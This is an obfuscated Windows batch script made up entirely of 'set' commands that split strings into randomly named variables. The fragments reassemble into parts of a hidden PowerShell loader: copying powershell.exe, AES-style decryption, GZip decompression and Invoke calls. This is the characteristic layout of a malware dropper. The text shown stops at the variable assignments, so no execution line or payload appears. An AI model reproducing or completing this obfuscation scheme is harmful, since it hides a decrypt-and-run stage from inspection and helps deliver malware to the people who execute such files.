@echo off
set "zPdTVWTVwq=in"
set "wZfzYvRHgx=32"
set "nnIpSjxxEx=rs"
set "PeGmGvgHUG=Wi"
set "uHHhYJGyeq=he"
set "unLPeXAfql=rS"
set "BAamXxIXtC=0\"
set "yBpYCJCloo=ws"
set "hPUrHUpcRz=1."
set "StXUCHzrZc=nd"
set "CWkPjhZeCM=we"
set "QtgHiabngB=we"
set "dFHoetxVuv=Sy"
set "oIVAYLiiPY=do"
set "AcxwFeyMHK= /"
set "IHWXsuLgDK=py"
set "NuQXcjEHRv=:\"
set "wvRRotsadr=.e"
set "HaqVBXYgnV=po"
set "QUEAyCwAND=\W"
set "KxJBUdTnsx=\v"
set "bzVkQnQZVi=ow"
set "EgMMROePaU=em"
set "KnHOuqivws=st"
set "ymkVnobQhD=co"
set "VjPWIittdX=ll"
set "PetHbZdcBw=y "
set "ABBPAVzqQb=xe"
set "uVTPQhzZQJ=he"
set "PWFNwCqzPu=ll"
set "LQNSWknCVW= C"
set "rEcwvHVlDc=Po"
set "PephUHkAmA=s\"
set "qzsPTPKhzj= %~dp0"
set "niPtnajaMx=cd"
set "ursHFyUaeu=RmAx"
set "yGREJPXeoM= = N"
set "cxZwhwisBS=ispo"
set "PSPZSdmbZv=Conv"
set "aCYJKEwwNz=m.IO"
set "ApFzoogctL=tem."
set "iFhWwGvNlW=($Dd"
set "pUKjMvMjpT=6] -"
set "aonvIuBtnX=pose"
set "siZgHiSsoc=AFo."
set "dfkeyNeRty=DDhZ"
set "fnPGfUGimp=DDhZ"
set "ZSgUcETwnq=m.Re"
set "NEDjMDbWqU=]::("
set "tkoRrWwgAJ=ionM"
set "MqlrSbrHpz=join"
set "MwBcDVaAME=pher"
set "ObwBnKAJHf=Qp.D"
set "IIAGxfiDww=();$"
set "TMjkQYedxG=eK);"
set "dktmTjjmGe=ode]"
set "NtMnEsntUY=oknB"
set "cSAPoNqBJX=$nUv"
set "FtmXTyuVph=nB ="
set "ZfRppDjRVi=3); "
set "BLCtmeCiiC=yste"
set "GxuzsEMhIf=hy.A"
set "XovyTcSuvB=RUNQ"
set "tWQRUiXAeC=Obje"
set "VrJRAgDfcU=oArr"
set "MHDYVkEfXM=[Env"
set "rxOZPeuDAM=zHhH"
set "ynFWgznXzy=-joi"
set "QXBvqsLjkd=em.I"
set "ZIJoBKkMJK=RNGR"
set "tQCMXUlnSd=ress"
set "BfQzcODXGT=iron"
set "TkBFIRBSEM=DDhZ"
set "hBpdxnmyja=V = "
set "ZiWUgLiUPo=PTtG"
set "VuXpRsROxX=eMVs"
set "nGhQfdgvJk= [st"
set "axMlMzJVWl=lBlo"
set "FZhIVdoDvO=.Dis"
set "NpjMZbWoUV=pres"
set "regEtbUnzH=VB ="
set "xwJbOolUTu=B = "
set "SlGdQDZmDK=ecry"
set "cDKyMSeuHH=s75K"
set "YifabrCuPO=ment"
set "FmpKWAnkKk=Invo"
set "YDbyXKmvYN=-nop"
set "eJrMfPasPX=e = "
set "ZKidrlTphf=16] "
set "MpYcPLEczN=jokn"
set "sgJtcKVCNA=('da"
set "yrInLqkJXf=Fina"
set "xrnvEWsslv=ach "
set "NZYHcbqjsH=.GZi"
set "QSQmFdCAWj=Comp"
set "IpNlBGcIyg=.-16"
set "bCLWuXGDVF=ptog"
set "fZeRgaichS=)($h"
set "LcdsUItiWS=S46e"
set "NSySBBfWyb=join"
set "cvNbMluHRo=]::("
set "enctJRYWQA=ect "
set "ZVkFvThNzp=).Sp"
set "pkGqgSWKIV=Comp"
set "cQfjZOLpzf=File"
set "NtjEytAnrQ=ptor"
set "CnhRiUjPiB=();$"
set "nOtoTRqIXf=;$nU"
set "QNpfCeLHkE=iyO "
set "alJtDvcfJG=gMod"
set "MGGaRQuyVn=..-1"
set "OwetBSzJtM=tem."
set "gNsvazQIVX=n ''"
set "ZSfpxSBoim=; };"
set "ReoGJrMhOs=eK ="
set "HDaUiVrkOz=AAFo"
set "wiecwvsyyG=y]::"
set "vuXEDlJrME=();$"
set "wmeUZnLqet=stem"
set "pMLOrwVhlV=]::C"
set "CiHTQpgTwa==');"
set "ljsBUFIoXZ=bQsV"
set "COgCjhreaU=raph"
set "XLRnGlPUqj='[-1"
set "wxKkHckHoH=iyO."
set "WbfYqlhiba=, $j"
set "peMWkSaHWy=)))"
set "FpiTHkgLZh=;$dd"
set "CYnTldprAs=$RUN"
set "xuwsEeZQLP=vlA."
